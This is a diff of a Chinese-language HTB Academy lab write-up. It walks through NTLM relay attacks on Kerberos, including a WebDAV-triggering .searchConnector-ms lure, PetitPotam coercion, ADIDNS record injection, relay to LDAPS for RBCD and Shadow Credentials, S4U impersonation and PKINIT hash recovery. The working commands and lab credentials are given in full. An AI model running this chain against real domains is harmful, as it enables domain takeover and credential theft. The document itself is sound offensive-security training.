@@ -1,184 +1,349 @@
-# Writeup：Advanced NTLM Relay Attacks Targeting Kerberos（WebClient 強制啟用 + RBCD）
+# Advanced NTLM Relay Attacks Targeting Kerberos
 
-**Module 情境**：HTB Academy *NTLM Relay Attacks* 課程 → Advanced NTLM Relay Attacks Targeting Kerberos 小節
-**關聯主機**：DC01（172.16.117.3）、SQL01（172.16.117.60）、WS01（172.16.117.50）
-**攻擊機**：10.129.205.223（ens192: 172.16.117.30）
-**認證**：`localws01` / NT hash `e4737f338324305993ed52f775a6d54d`（本機帳密，pass-the-hash）
+**Module**：HTB Academy — *NTLM Relay Attacks* → Advanced NTLM Relay Attacks Targeting Kerberos
+
+**環境**
+
+| 角色 | 主機 | IP |
+|---|---|---|
+| 攻擊跳板（Linux） | ACADEMY-NTLMR01-LINUX01 | SSH `10.129.45.81`，內網 `ens192 = 172.16.117.30` |
+| DC + ADCS CA | DC01 | `172.16.117.3` |
+| 受害機（WebDAV victim） | SQL01 | `172.16.117.60` |
+| 工作站 | WS01 | `172.16.117.50` |
+
+**網域**：`inlanefreight.local`
+**低權限網域帳號**：`inlanefreight\rons`，NT hash `914b011029e6b43cf188d435951831bd`（pass-the-hash）
+
+> 工具都在跳板的 `~/tools/`（impacket、PetitPotam、krbrelayx、PKINITtools、Responder、Certipy…）。
+> 本文所有指令都在跳板 `htb-student@10.129.45.81` 上執行；需要 root（綁 80/445）的用 `sudo`。
+
+---
+
+## 前置：建立可重用的 SSH 連線 + sudo
+
+密碼登入每次都要互動，於是用 SSH ControlMaster 共用一條連線：
+
+```bash
+ssh -o ControlMaster=yes -o ControlPath=~/.htbcm.sock -o ControlPersist=600 \
+    htb-student@10.129.45.81    # 密碼 HTB_@cademy_stdnt!
+# 之後所有指令：
+ssh -o ControlPath=~/.htbcm.sock htb-student@10.129.45.81 '<cmd>'
+```
+
+**除錯重點 1 — 背景服務會被 SSH session 砍掉**
+一開始用 `setsid nohup ntlmrelayx.py ... &` 起 relay，log 明明印了 `Servers started`，但下一條指令去看 `ss -ltnp` 就發現 process 不見了、`curl` 回 `000`。SSH session 關閉時 SIGHUP 把它帶走了（`setsid` 也救不回來）。
+
+**解法**：所有長駐服務一律丟進 root 的 `tmux` session，跟 SSH 生命週期脫鉤：
+
+```bash
+sudo tmux new-session -d -s relay "ntlmrelayx.py ... | tee /tmp/relay.log"
+sudo tmux capture-pane -pt relay -S -40   # 讀即時輸出
+```
+
+**除錯重點 2 — `tee` 會把 log buffer 住**
+用 `... | tee /tmp/relay.log` 時，`cat /tmp/relay.log` 常常是舊的（block buffering）。改成 `stdbuf -oL -eL ntlmrelayx.py ... > /tmp/relay.log 2>&1`（行緩衝），再 `chmod 666` log 檔，就能用非 root 穩定 tail。
 
 ---
 
 ## Q1：用 `.searchConnector-ms` 強制 `\\DC01\Testing` 的瀏覽者啟用 WebDAV
 
-### 1. 確認 `\\DC01\Testing` 匿名可寫
+**原理**：`.searchConnector-ms` 內的 `simpleLocation/url` 指到攻擊機的 HTTP/WebDAV；當有主機（透過排程）去開 `\\DC01\Testing` 這個資料夾時，Windows 的 Explorer/索引器會去連那個 URL，進而**啟動該主機的 WebClient 服務**（= WebDAV 被啟用）。WebDAV 的 HTTP 認證沒有 SMB 的簽章保護，後面才能拿去 relay 到 LDAP。
+
+### 1. 確認可寫入 Testing 分享
 
 ```bash
-smbclient //172.16.117.3/Testing -N -c 'ls'
-echo test > /tmp/w.txt
-smbclient //172.16.117.3/Testing -N -c 'put /tmp/w.txt w.txt; ls; del w.txt'
+printf 'shares\nuse Testing\nls\n' | \
+  smbclient.py -hashes :914b011029e6b43cf188d435951831bd \
+  inlanefreight.local/rons@dc01.inlanefreight.local
 ```
 
-匿名 READ+WRITE 都通。
+`rons` 可讀寫 `Testing`（順便看到還有 `CertEnroll` 分享 → 有 ADCS，供後面 AD CS 小節用）。
 
-### 2. 第一版誘餌：folderType GUID 寫錯，完全沒反應
-
-一開始手刻的 `.searchConnector-ms` 用了一個憑記憶寫的 `folderType` GUID：
-
-```xml
-<folderType>{91475FE5-586B-4EBA-8D75-D17D8DC9CD8A}</folderType>
-```
-
-丟進 `\\DC01\Testing` 後，攻擊機上開 `python3 -m http.server 80` 守了快 20 分鐘完全沒收到任何連線。
-
-**除錯過程**：先用 `tcpdump -i ens192 'tcp port 80'` 側錄排除「http.server 日誌被 buffer 卡住」的可能，確認真的 0 封包。回頭查 `~/tools/CrackMapExec/cme/modules/drop-sc.py`（CrackMapExec 內建、專門做這個技巧的模組），發現正確的 GUID 其實是：
-
-```xml
-<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
-```
-
-跟我手刻的只差幾個字元 —— GUID 打錯，Windows 直接把這個檔案當成無效的 search connector 忽略掉，完全不會觸發任何行為。這是本題最大的坑，寧可直接抄 CME 模組裡驗證過的 payload，別自己憑印象拼 GUID。
-
-### 3. 修正後的誘餈
+### 2. 放誘餌檔
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
-  <description>Microsoft Outlook</description>
-  <isSearchOnlyItem>false</isSearchOnlyItem>
-  <includeInStartMenuScope>true</includeInStartMenuScope>
-  <iconReference>http://172.16.117.30/windows/0001.ico</iconReference>
-  <templateInfo>
-    <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
-  </templateInfo>
-  <simpleLocation>
-    <url>http://172.16.117.30/windows</url>
-  </simpleLocation>
+<description>Microsoft Outlook</description>
+<isSearchOnlyItem>false</isSearchOnlyItem>
+<includeInStartMenuScope>true</includeInStartMenuScope>
+<iconReference>http://172.16.117.30/windows/0001.ico</iconReference>
+<templateInfo>
+<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
+</templateInfo>
+<simpleLocation>
+<url>http://172.16.117.30/windows</url>
+</simpleLocation>
 </searchConnectorDescription>
 ```
 
-上傳到 `\\DC01\Testing`，攻擊機上監聽 80 port，等待 lab 環境內部的背景「使用者瀏覽網路共享」排程觸發（跟前一個模組 LLMNR/NBT-NS 的誘餈行為一樣，不是即時的，耐心等幾分鐘）。
-
-### 4. 抓到結果
+> **坑**：`folderType` GUID 必須正好是 `{91475FE5-586B-4EBA-8D75-D17434B8CDF6}`。GUID 打錯 Windows 會直接當無效檔忽略，守再久都沒連線。別憑印象拼，直接抄 CrackMapExec 的 `drop-sc` 模組 payload。
 
 ```bash
-sudo tcpdump -i ens192 -n 'tcp port 80 or tcp port 445' and not host 10.129.205.223
+cd /tmp && printf 'use Testing\nput testing.searchConnector-ms\nls\n' | \
+  smbclient.py -hashes :914b011029e6b43cf188d435951831bd \
+  inlanefreight.local/rons@dc01.inlanefreight.local
 ```
 
-```
-11:06:36 IP 172.16.117.60.51077 > 172.16.117.30.80: Flags [SEW] ... HTTP: OPTIONS /windows HTTP/1.1
-11:06:36 IP 172.16.117.30.80 > 172.16.117.60.51077: HTTP/1.0 501 Unsupported method ('OPTIONS')
+> impacket `smbclient.py` 的 `put` 只吃單一本機路徑、用 basename 上傳，不能 `put a b`。
+
+### 3. 起 HTTP listener，抓誰連進來
+
+```python
+# /tmp/log80.py — 記錄來源 IP 與 User-Agent，PROPFIND/OPTIONS 都收
+import http.server,datetime
+class H(http.server.BaseHTTPRequestHandler):
+    def _l(s):
+        print(datetime.datetime.now().strftime("%H:%M:%S"),s.client_address[0],
+              s.command,s.path,"UA="+s.headers.get("User-Agent",""),flush=True)
+        s.send_response(200);s.send_header("Content-Length","0");s.end_headers()
+    do_GET=do_HEAD=do_OPTIONS=do_PROPFIND=_l
+    def log_message(s,*a):pass
+http.server.HTTPServer(("0.0.0.0",80),H).serve_forever()
 ```
 
-`python -m http.server` 不支援 `OPTIONS`（WebDAV 探測的第一步），回了 501，但這剛好證明：**172.16.117.60（SQL01）真的發出了 WebDAV OPTIONS 探測**，代表它的 WebClient 服務已經被這個誘餈成功啟用。
+```bash
+sudo tmux new-session -d -s nl "python3 /tmp/log80.py > /tmp/l80.out 2>&1"
+```
 
-**Q1 答案：`172.16.117.60`**
+> 起之前發現 `:80` 被上一輪殘留的 `ntlmrelayx.py` 佔著，先 `sudo pkill -f ntlmrelayx.py`。
+
+等約 2–3 分鐘：
+
+```
+12:34:26 172.16.117.60 OPTIONS  /windows UA=Microsoft-WebDAV-MiniRedir/10.0.17763
+12:34:26 172.16.117.60 PROPFIND /windows UA=Microsoft-WebDAV-MiniRedir/10.0.17763
+```
+
+來源 `172.16.117.60`、UA 是 `Microsoft-WebDAV-MiniRedir` → **SQL01 的 WebClient 已啟動（WebDAV 已啟用）**。
+
+### ✅ Q1 Answer：`172.16.117.60`
 
 ---
 
-## Q2 / Q3：強制該機器發出 HTTP NTLM 認證，中繼到 LDAP 做 RBCD，冒充 Administrator
+## Q2：把 SQL01 的 HTTP NTLM relay 到 LDAP，用 RBCD 拿下 SQL01
 
-> 使用者提供的教材提示（逐字保留，作為後續操作依據）：
-> 1. 強制目標啟用 WebClient（= Q1，已完成）
-> 2. Responder 關閉 HTTP/SMB 伺服器，準備毒化廣播
-> 3. `ntlmrelayx` 中繼認證到 DC，修改 RBCD 屬性
-> 4. 用 `printerbug.py` 強制目標電腦向攻擊機發起 HTTP NTLM 認證
-> 5. 用 `getST.py` 請求服務票證
-> 6. 用 `psexec.py` 做 Pass-the-Ticket 取得 Shell
+**攻擊鏈**：coerce SQL01 → 它用機器帳號 `SQL01$` 對我們做 WebDAV(HTTP) 認證 → `ntlmrelayx` relay 到 DC 的 LDAPS → `--delegate-access` 幫我們新建一台電腦帳號並在 `SQL01$` 上設定 RBCD → `getST` 用該電腦帳號 S4U 冒充 Administrator 拿 `cifs/sql01` 票 → 讀 flag。
 
-### 1. 架設可長時間存活的 relay（踩到的系統層坑）
-
-**坑 1：`ntlmrelayx` 透過 `nohup ... &; disown` 背景啟動，SSH session 一斷就死**
-
-一開始沿用前兩個模組對 Responder 有效的做法（`sudo nohup python3 ... > log 2>&1 & disown`），結果 `ntlmrelayx` 每次 SSH 連線關閉後幾秒內就消失，`ps aux` 查無此程式，`ss -tlnp` 也沒有 port 80 的監聽。
-
-逐步排查：
-- 先懷疑是 systemd-logind 的 `KillUserProcesses`（登出砍掉整個使用者 session 的 cgroup），`loginctl enable-linger htb-student` 之後還是一樣會死。
-- 真正原因：**`ntlmrelayx.py` 內部有個互動式指令迴圈會持續讀 stdin**；用 `nohup ... &` 時 stdin 繼承自已經要關閉的 SSH pty，SSH session 一斷，stdin 立刻變成 EOF，`ntlmrelayx` 的主迴圈讀到 EOF 就自己正常退出（不是被砍，是自己讀到 EOF 退出的）。
-
-**修法**：改用 `tmux` 開一個長駐 session，在裡面跑 `ntlmrelayx`，因為 tmux 的 pty 不會因為 SSH 斷線而關閉：
+### 1. 確認 MachineAccountQuota
 
 ```bash
-tmux new-session -d -s relay2
-tmux send-keys -t relay2 'sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --delegate-access ...' Enter
-tmux send-keys -t relay2 "$(cat ~/.pw)" Enter   # sudo 密碼另外送，不要用 pipe
+python3 -c 'from impacket.ldap import ldap
+l=ldap.LDAPConnection("ldap://172.16.117.3","DC=inlanefreight,DC=local","172.16.117.3")
+l.login("rons","","inlanefreight.local","","914b011029e6b43cf188d435951831bd")
+print(l.search(searchFilter="(objectClass=domain)",attributes=["ms-DS-MachineAccountQuota"]))'
+# ms-DS-MachineAccountQuota = 10  →  ntlmrelayx 可自動建電腦帳號
 ```
 
-**坑 2：`echo PASS | sudo -S ntlmrelayx.py ...` 會讓 stdin 變成「有限管道」**
-
-一度改成用 `echo PASS | sudo -S ...` 餵密碼，結果一樣馬上死掉 —— 因為 `echo` 輸出完就關閉管道，`sudo` 把這個已關閉的管道原樣傳給子程式當 stdin，一樣是立即 EOF。**正確做法**：在 tmux 的真實 pty 裡讓 `sudo` 用互動提示問密碼，再用 `tmux send-keys` 把密碼當「打字」送進去 —— 這樣 stdin 一路都是活的 pty，不會 EOF。
-
-**坑 3：連續 kill + 立刻重啟會撞到 `Address already in use`**
-
-`pkill` 之後沒等夠久就重新 bind 同一個 port，常撞到：
-
-```
-OSError: [Errno 98] Address already in use
-```
-
-而且程式不會整個崩潰，只是負責 HTTP/SMB 的那條 thread 掛掉、主程式留著變成「看起來活著但其實沒在聽任何 port」的殭屍態。**修法**：`pkill -9` 之後至少 `sleep 4` 再重啟，每次重啟後都要用 `ss -tlnp` 實際確認 port 真的有 bind 住，不要只看 log 印了「Servers started」就相信。
-
-### 2. 用 `printerbug.py` 觸發，踩到 SMB Signing 跟 impacket 本身的 bug
+### 2. 起 relay（LDAPS + --delegate-access）
 
 ```bash
-python3 ~/tools/krbrelayx/printerbug.py \
-  -hashes :e4737f338324305993ed52f775a6d54d \
-  localws01@172.16.117.60 172.16.117.30
+sudo tmux new-session -d -s relay \
+ "stdbuf -oL -eL ntlmrelayx.py -t ldaps://172.16.117.3 -smb2support \
+   --delegate-access --no-dump > /tmp/relay.log 2>&1"
 ```
 
-第一次用純 SMB relay（`ntlmrelayx -t ldap://172.16.117.3 --no-http-server`），真的收到回連：
+### 3. coerce SQL01 走 WebDAV —— **這裡卡最久**
 
-```
-[*] SMBD-Thread-2: Received connection from 172.16.117.60, attacking target ldap://172.16.117.3
-[!] The client requested signing. Relaying to LDAP will not work!
-```
-
-**根因**：用 `cme smb 172.16.117.50 172.16.117.60 172.16.117.3` 檢查三台的 SMB signing，SQL01/WS01 的「伺服器端」都顯示 `signing:False`（不強制），但電腦帳號（`SQL01$`）**當 SMB 用戶端**回連時，預設行為是主動要求 signing —— 這是電腦帳號本身的客戶端策略，跟伺服端設定無關。一旦來源連線要求了 signing，不管中繼到哪個協定都無法重放，這是 NTLM relay 的硬限制，**不是** signing 設定錯誤的問題。
-
-嘗試用 `--remove-mic`（CVE-2019-1040，剝除 MIC 來繞過 signing 檢查）：
+第一次直接把 PetitPotam 的 listener 設成 IP：
 
 ```bash
-sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --delegate-access --remove-mic --no-http-server ...
+python3 ~/tools/PetitPotam/PetitPotam.py -d inlanefreight.local -u rons \
+  -hashes :914b011029e6b43cf188d435951831bd 172.16.117.30@80/test 172.16.117.60
+# [+] Attack worked!   ← 但 relay 完全沒反應
 ```
 
-這次真的 relay 成功了一次，但 impacket 的 `ldapattack.py` 在 `--remove-mic` 繞過 signing 之後，relay 回來的使用者名稱變成**空字串**（可能是 MIC 被剝除後連帶讓 Type3 訊息裡的 username 欄位解析跑掉），導致程式自己丟 `IndexError`：
-
-```python
-# ldapattack.py
-if self.config.delegateaccess and self.username[-1] == '$':
-IndexError: string index out of range
-```
-
-這個 bug 在系統裝的 impacket v0.10.0 跟使用者自己 pipx 裝的 v0.11.0 都存在，不是版本問題，是 `--remove-mic` 搭配這個特定的 relay 場景本身就會讓 username 解析壞掉。**結論**：`--remove-mic` + SMB 來源不是穩定可行的路，這條路放棄。
-
-### 3. 回到教材提示的正解方向：HTTP 來源（WebDAV）
-
-HTTP NTLM 認證沒有 SMB 的 signing 問題，完全繞開上面那個死胡同，這也是為什�么教材提示明確說「強制 **HTTP** NTLM 認證」而不是 SMB。最終設定：
+用 tcpdump 側錄才看懂：
 
 ```bash
-sudo /home/htb-student/.local/bin/ntlmrelayx.py \
-  -t ldap://172.16.117.3 -smb2support \
-  --delegate-access --no-validate-privs \
-  --no-smb-server --no-wcf-server --no-raw-server
+sudo tcpdump -ni ens192 'src host 172.16.117.60 and dst port 80'
+# 172.16.117.60.50386 > 172.16.117.30.80: PROPFIND /test/PIPE/srvsvc
 ```
 
-`--no-validate-privs` 是為了繞過另一個會在「relay 回來的身份在 LDAP 查不到對應 entry」時炸掉的 `validatePrivileges()` IndexError（同樣是電腦帳號 relay 時的已知邊界情況）。
+SQL01 **確實連進 :80 了**，`ntlmrelayx` 也回了 401，但 SQL01 **始終不送 NTLM**。
 
-`printerbug.py` 預設只會走 SMB 回連（`\\attackerhost\pipe\spoolss`），嘗試在 `attackerhost` 參數加 WebDAV 慣用的 `@80` 後綴（`172.16.117.30@80`）想讓它變成走 HTTP，但 Spooler RPC 的 `pszLocalMachine` 欄位似乎對主機名稱格式比 EFSRPC 的 `FileName` 嚴格，直接快速回 `RPC_S_SERVER_UNAVAILABLE`（没有真正嘗試連線），跟 EFSRPC 的 free-form 字串欄位行為不一樣。
+**根因**：WebClient 只會對「內部網路區域（Intranet Zone）」的主機自動送 NTLM 認證。目標是**裸 IP**時被判為 Internet Zone → 不送認證。要用一個**單標籤主機名**（single-label，無點）讓它被判為 Intranet。
 
-### 4. 目前狀態（誠實記錄，供後續接續）
+**修法**：在 AD-integrated DNS 加一筆 A record 指向攻擊機。`krbrelayx` 的 `dnstool.py` 不支援 `-hashes`，所以先用 hash 換一張 TGT，再用 `-k`：
 
-- `ntlmrelayx` 已經正確配置成「監聽 HTTP、relay 到 LDAP、`--delegate-access` 自動建立電腦帳號並設定 RBCD、`--no-validate-privs` 避開已知崩潰」，長駐在 tmux session `relay2` 裡，不會因為 SSH 斷線而死。
-- `\\DC01\Testing` 上的 `.searchConnector-ms` 誘餈持續有效（已確認至少成功觸發一次 WebDAV 探測），持續等待 lab 背景排程再次瀏覽該共享，讓 SQL01 的機器帳號對我方 HTTP 監聽器送出**完整**（帶 NTLM 認證，不只是 OPTIONS 探測）的 WebDAV 存取請求。
-- 主動用 `printerbug.py`／Coercer 的 EFSR `@port` 技巧嘗試「隨時觸發」都沒有成功過一次（`tcpdump` 側錄確認 0 封包），目前判斷：**這個環境裡真正能觸發 WebDAV 存取的只有 Explorer／搜尋連接器自己的被動解析機制，不是 RPC 層的主動 coerce**。
-- Q2（RBCD 設定後冒充 Administrator 讀 WS01/SQL01 上的 `flag.txt`）跟 Q3（relay CJAQ 的認證到 LDAP 建立 JPEREZ 的 Shadow Credentials）尚未完成，相依於上述被動觸發何時再度發生。
+```bash
+# 1) PtH 換 TGT
+getTGT.py inlanefreight.local/rons -hashes :914b011029e6b43cf188d435951831bd -dc-ip 172.16.117.3
 
-### 5. 本階段學到的除錯方法論彙總
+# 2) 加 DNS 記錄 attacker -> 172.16.117.30
+cd ~/tools/krbrelayx
+KRB5CCNAME=/tmp/rons.ccache python3 dnstool.py -k -u 'inlanefreight.local\rons' \
+  -dc-ip 172.16.117.3 -dns-ip 172.16.117.3 \
+  -r attacker -a add -t A -d 172.16.117.30 dc01.inlanefreight.local
+# [+] LDAP operation completed successfully
+```
 
-| 坑 | 根因 | 修法 |
+> `dnstool.py` 會先去解析 zone 的 SOA，用系統 resolver（`127.0.0.53`）會 SERVFAIL，必須加 `-dns-ip 172.16.117.3` 把 DNS 指向 DC。記錄進 LDAP 後約 180 秒才會被 DNS 服務載入：
+> ```bash
+> nslookup attacker.inlanefreight.local 172.16.117.3   # 等到回 172.16.117.30
+> ```
+
+用**單標籤名** coerce（SQL01 會補上自己的 DNS 後綴解析，且因無點被判 Intranet → 送 NTLM）：
+
+```bash
+python3 ~/tools/PetitPotam/PetitPotam.py -d inlanefreight.local -u rons \
+  -hashes :914b011029e6b43cf188d435951831bd attacker@80/test 172.16.117.60
+```
+
+relay log：
+
+```
+[*] HTTPD(80): Authenticating against ldaps://172.16.117.3 as INLANEFREIGHT/SQL01$ SUCCEED
+[*] Adding new computer with username: CKVANVID$ and password: Rt^5yFWm*!OWHxJ result: OK
+[*] Delegation rights modified succesfully!
+[*] CKVANVID$ can now impersonate users on SQL01$ via S4U2Proxy
+```
+
+### 4. S4U 冒充 Administrator，讀 flag
+
+```bash
+cd /tmp
+getST.py -spn cifs/sql01.inlanefreight.local -impersonate Administrator \
+  -dc-ip 172.16.117.3 'inlanefreight.local/CKVANVID$:Rt^5yFWm*!OWHxJ'
+# -> Administrator.ccache
+
+KRB5CCNAME=/tmp/Administrator.ccache smbclient.py -k -no-pass sql01.inlanefreight.local <<'EOF'
+use C$
+cd Users\Administrator\Desktop
+get flag.txt
+EOF
+```
+
+### ✅ Q2 Answer：`RBCD_Using_NTLMRelay`
+
+---
+
+## Q3：把 CJAQ 的 HTTP NTLM relay 到 LDAP，對 JPEREZ 做 Shadow Credentials
+
+**攻擊鏈**：relay 網域使用者 `CJAQ`（對 `jperez` 有寫入權）→ LDAP → `ntlmrelayx --shadow-credentials` 在 `jperez` 的 `msDS-KeyCredentialLink` 塞一張憑證 → PKINIT 拿 `jperez` 的 TGT → `getnthash` 取 NT hash → `jperez` 屬 *Remote Management Users* → evil-winrm 連 DC 讀 flag。
+
+### 1. 先看 jperez / cjaq
+
+```bash
+# jperez memberOf -> CN=Remote Management Users  (→ 可 WinRM 進 DC)
+# 用 impacket LDAP 查 sAMAccountName=jperez / cjaq 的 DN、memberOf
+```
+
+### 2. 起 shadow-credentials relay
+
+```bash
+sudo tmux new-session -d -s relay \
+ "stdbuf -oL -eL ntlmrelayx.py -t ldaps://172.16.117.3 -smb2support \
+   --shadow-credentials --shadow-target jperez > /tmp/relay.log 2>&1"
+```
+
+並把 Testing 的誘餌改成單標籤名（讓瀏覽者走認證版 WebDAV）：`http://attacker/windows`。
+
+### 3. 關鍵排錯 —— 為什麼一直抓不到 CJAQ
+
+連 relay 的永遠只有 SQL01（`172.16.117.60`），而且身分是一個**本機帳號誘餌** `SQL01/SQL01LOCALUSERNAME`：
+
+```
+[*] Authenticating against ldaps://172.16.117.3 as SQL01/SQL01LOCALUSERNAME SUCCEED
+    IndexError: list index out of range        # 非網域使用者，privilege 查詢爆掉
+[*] ...Connection from 172.16.117.60 controlled, but there are no more targets left!
+```
+
+**兩個致命點：**
+
+1. **單一 target 被第一個認證吃掉**。`ntlmrelayx` 用單一 `-t` 時，第一個成功 relay（就算後續 attack 失敗）就把 target 移除，之後所有連線都 `no more targets left`。誘餌搶在前面，CJAQ 永遠排不到。
+2. **擋掉 .60 後 14 分鐘零連線** → 代表 CJAQ 根本不是從 .60 來。
+
+**曾經走的彎路**：
+- 寫 watchdog「一偵測到 `no more targets left` 就重啟 relay 重置 dedup」→ 快速重啟造成 :80 間歇性 refused，把受害機的 **WebDAV negative cache** 搞髒，結果 14 分鐘完全沒主機來連。放棄。
+
+**找出真相 — 被動 NTLM 盤點（不消耗 target）**：
+自己手刻一個會回 Type2 challenge 的 HTTP server 來記錄所有 WebDAV 認證的使用者名；但用 impacket 組 `NTLMAuthChallenge` 時 `NTLMSSP_NEGOTIATE_VERSION` flag 需要 Version 欄位，噴 `Trying to pack None`，不值得繼續手刻。改用 **Responder 純被動擷取**：
+
+```bash
+cd ~/tools/Responder && python3 Responder.py -I ens192 -v
+```
+
+Responder 的紀錄揭露真相：
+
+```
+[HTTP] NTLMv2 Client   : fe80::6d4c:ab8c:8e47:177b      # IPv6 link-local，另一台主機
+[HTTP] NTLMv2 Username : INLANEFREIGHT\cjaq
+[HTTP] NTLMv2 Username : INLANEFREIGHT\nports
+```
+
+→ **CJAQ 來自另一台主機（IPv6），而且它只透過 LLMNR/mDNS 的「名稱投毒」才會連到我們**。它解析不到單播 DNS 的 `attacker`，退回多播查詢；純 `ntlmrelayx`（只綁 IPv4、靠 DNS）因此永遠看不到 CJAQ，只有能正常 DNS 解析的 SQL01 會連進來。
+
+### 4. 正確組合：Responder（只投毒）+ ntlmrelayx（relay，多 target + IPv6）
+
+把 Responder 的 HTTP/SMB server 關掉（讓出 80/445），只留投毒器；`ntlmrelayx` 用 `-6` 同時聽 IPv4/IPv6，並用 `-tf` 給多個「拼法不同但都指向 DC01」的 LDAPS target，讓它能連續 relay 不同使用者（誘餌、peter、nports 各吃一個 slot，CJAQ 來時仍有 slot）：
+
+```bash
+# Responder.conf: SMB = Off, HTTP = Off  （保留 LLMNR/NBT-NS/mDNS 投毒）
+cat > /tmp/targets.txt <<'EOF'
+ldaps://172.16.117.3
+ldaps://dc01
+ldaps://DC01
+ldaps://dc01.inlanefreight.local
+ldaps://DC01.INLANEFREIGHT.LOCAL
+ldaps://inlanefreight.local
+ldaps://INLANEFREIGHT.LOCAL
+ldaps://dc01.INLANEFREIGHT.local
+EOF
+
+sudo tmux new-session -d -s relay \
+ "stdbuf -oL -eL ntlmrelayx.py -tf /tmp/targets.txt -6 -smb2support \
+   --shadow-credentials --shadow-target jperez > /tmp/relay.log 2>&1"
+sudo tmux new-session -d -s resp \
+ "cd ~/tools/Responder && stdbuf -oL -eL python3 Responder.py -I ens192 -v > /tmp/resp.out 2>&1"
+```
+
+不到 1 分鐘：
+
+```
+[*] HTTPD(80): Authenticating against ldaps://DC01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/CJAQ SUCCEED
+[*] Saved PFX (#PKCS12) certificate & key at path: t5F7iHsQ.pfx
+[*] python3 PKINITtools/gettgtpkinit.py -cert-pfx t5F7iHsQ.pfx \
+      -pfx-pass uz0L5HfNggH7zSbwg7ro INLANEFREIGHT.LOCAL/jperez t5F7iHsQ.ccache
+```
+
+### 5. PKINIT → NT hash → WinRM 進 DC
+
+```bash
+cd /tmp
+# 1) 用 shadow 憑證換 jperez 的 TGT
+python3 ~/tools/PKINITtools/gettgtpkinit.py -cert-pfx /tmp/t5F7iHsQ.pfx \
+  -pfx-pass uz0L5HfNggH7zSbwg7ro INLANEFREIGHT.LOCAL/jperez /tmp/jperez.ccache
+#   AS-REP encryption key: 40740a28470aa76bf13227d8d59ea2a628dca5761d9f1c598cd05a95ccf2ca1d
+
+# 2) 取 jperez NT hash
+KRB5CCNAME=/tmp/jperez.ccache python3 ~/tools/PKINITtools/getnthash.py \
+  -key 40740a28470aa76bf13227d8d59ea2a628dca5761d9f1c598cd05a95ccf2ca1d \
+  INLANEFREIGHT.LOCAL/jperez
+#   Recovered NT Hash: c9d393c8a0b2dfcf72eba102df5ceee6
+
+# 3) jperez 屬 Remote Management Users → WinRM 進 DC01 讀自己的桌面
+printf 'type C:\\Users\\jperez\\Desktop\\flag.txt\nexit\n' | \
+  evil-winrm -i 172.16.117.3 -u jperez -H c9d393c8a0b2dfcf72eba102df5ceee6
+```
+
+### ✅ Q3 Answer：`Shadow_Cr3dent1als_4ttcks`
+
+---
+
+## 總結（本小節踩過的坑）
+
+| 現象 | 根因 | 解法 |
 |---|---|---|
-| `.searchConnector-ms` 完全沒反應 | `folderType` GUID 憑記憶手刻打錯 | 直接抄 CrackMapExec `drop-sc.py` 模組裡驗證過的 GUID/格式 |
-| `ntlmrelayx` 背景啟動後幾秒就消失 | 程式內部持續讀 stdin，`nohup &` 繼承的 stdin 一斷線就 EOF，程式自己讀到 EOF 退出 | 用 `tmux` 開真實 pty 長駐，密碼用 `send-keys` 打字送入，不要用管道餵 |
-| `echo PASS \| sudo -S long_running_cmd &` | pipe 寫完就關閉，造成同樣的 stdin EOF 問題 | 同上，不要對需要長駐、會讀 stdin 的程式用管道餵密碼 |
-| 連續重啟撞 `Address already in use` | kill 後沒等 socket 完全釋放就重新 bind | `pkill -9` 後 `sleep 4+`，重啟後用 `ss -tlnp` 實際核對 port |
-| SMB 回連秀 `client requested signing` | 電腦帳號當 SMB client 預設要求 signing，跟伺服端設定無關；NTLM relay 遇到 signing 來源就是死局 | 改用不受 signing 影響的 HTTP 來源做 relay |
-| `--remove-mic` relay 成功後炸 `IndexError` | CVE-2019-1040 MIC 移除技巧在這個場景讓 relay 回來的 username 變空字串，impacket 的 `ldapattack.py` 沒處理這個邊界 | 不要依賴 `--remove-mic` 當 SMB signing 的萬用解法；優先找不受 signing 影響的來源協定 |
-| `validatePrivileges()` 對電腦帳號 relay 丟 `IndexError` | LDAP 查不到對應使用者 entry 的已知邊界 bug | 加 `--no-validate-privs` 跳過這段檢查 |
+| 背景 relay 起了就死 | SSH session 關閉 SIGHUP | 丟 root `tmux` |
+| log 不更新 | `tee` block buffering | `stdbuf -oL` + `> file` |
+| coerce「成功」但 relay 沒反應 | 裸 IP 被判 Internet Zone，WebClient 不送 NTLM | 加單標籤 DNS A record，用 `attacker@80` coerce |
+| `dnstool.py` 不吃 `-hashes` / SOA SERVFAIL | 工具限制 / resolver 不對 | `getTGT` 換 TGT 後 `-k`、加 `-dns-ip 172.16.117.3` |
+| 永遠只抓到 SQL01 誘餌 | 單 target 被先到者吃掉；CJAQ 走多播投毒、IPv6 | Responder 只投毒 + `ntlmrelayx -6 -tf` 多 target |
+
+## 清理
+
+```bash
+sudo tmux kill-server; sudo pkill -f 'ntlmrelayx.py|Responder.py'
+# 還原 Responder.conf；DNS 記錄可用 dnstool -a remove 清掉
+```
